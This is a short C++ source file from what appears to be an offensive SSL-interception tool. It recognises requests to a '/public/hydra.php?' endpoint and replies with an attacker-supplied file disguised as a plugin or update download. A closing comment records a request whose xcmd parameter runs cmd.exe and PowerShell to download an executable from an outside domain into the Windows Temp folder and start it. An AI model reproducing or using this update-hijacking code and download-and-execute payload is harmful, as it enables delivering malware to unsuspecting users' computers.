
#include "../attacker.h"
#include "Plugin360.h"
#include <windows.h>
#include "sslPublic.h"
#include "../cipher/CryptoUtils.h"
#include "../HttpUtils.h"
#include "PluginServer.h"


int TSZPlugin::is360Plugin(string url, string host) {
	if (/*strstr(host.c_str(), "miserupdate.aliyun.com") &&*/ strstr(url.c_str(), "/public/hydra.php?"))
	{
		return TRUE;
	}

	return FALSE;
}


int TSZPlugin::reply360Plugin(char * dstbuf, int len, LPSSLPROXYPARAM lpssl) {
	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Connection: keep-alive\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Content-Length: %u\r\n\r\n";

	string filename = Public::getUserUrl(lpssl->username, QQMUSIC_UPDATE_FN);
	int ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpPartialZipFormat, 1);
	return ret;
}





//GET /public/hydra.php?
//xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe',
//'%SystemRoot%/Temp/mntiybdtpruehla17861.exe');start%20%SystemRoot%/Temp/mntiybdtpruehla17861.exe